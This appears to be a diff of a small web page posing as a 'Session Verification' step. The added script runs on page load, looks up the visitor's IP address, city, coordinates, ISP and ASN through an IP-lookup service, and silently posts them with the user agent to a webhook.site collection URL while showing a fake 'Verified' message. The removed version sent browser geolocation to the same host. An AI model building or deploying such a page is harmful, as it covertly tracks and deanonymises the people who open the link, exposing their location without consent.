@@ -2,31 +2,40 @@
 <html>
 <head>
   <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
 </head>
+
 <body style="font-family:Arial;text-align:center;margin-top:50px;">
   <h3>Session Verification</h3>
-  <button onclick="sendLocation()">Verify</button>
+  <p>Verifying device and region...</p>
 
   <script>
-    function sendLocation() {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              userAgent: navigator.userAgent,
-              time: new Date().toISOString()
-            })
-          });
-          document.body.innerHTML = "<h3>Verified ✅</h3>";
-        },
-        (err) => alert("Location denied: " + err.message)
-      );
-    }
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            isp: data.org,
+            asn: data.asn,
+            userAgent: navigator.userAgent,
+            time: new Date().toISOString()
+          })
+        });
+
+        document.body.innerHTML = "<h3>Verified ✅</h3>";
+      })
+      .catch(err => {
+        document.body.innerHTML =
+          "<h3>Verification failed</h3><p>" + err + "</p>";
+      });
   </script>
 </body>
 </html>
